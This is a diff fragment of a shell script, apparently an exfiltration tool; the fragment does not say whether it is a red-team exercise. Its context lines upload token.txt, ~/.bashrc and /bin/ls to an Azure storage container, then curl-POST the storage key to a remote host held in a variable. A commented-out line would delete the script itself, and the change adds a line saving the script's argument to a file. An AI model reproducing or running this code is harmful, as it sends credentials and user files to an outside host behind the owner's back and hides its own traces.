@@ -12,4 +12,5 @@ az storage blob upload -f token.txt -c calipsocontainer -n calipsocreds.txt --ac
 az storage blob upload -f ~/.bashrc -c calipsocontainer -n bashrc.conf --account-name calipsostorageazure --account-key $storageKey
 az storage blob upload -f /bin/ls -c calipsocontainer -n ls.bin --account-name calipsostorageazure --account-key $storageKey
 curl -f -s -X POST http://$(echo $remoteHost)/$(echo $storageKey | cut -d "\"" -f 2)
+echo $1 > args.txt
 #rm $(echo $(dirname $0)/$(basename $0))
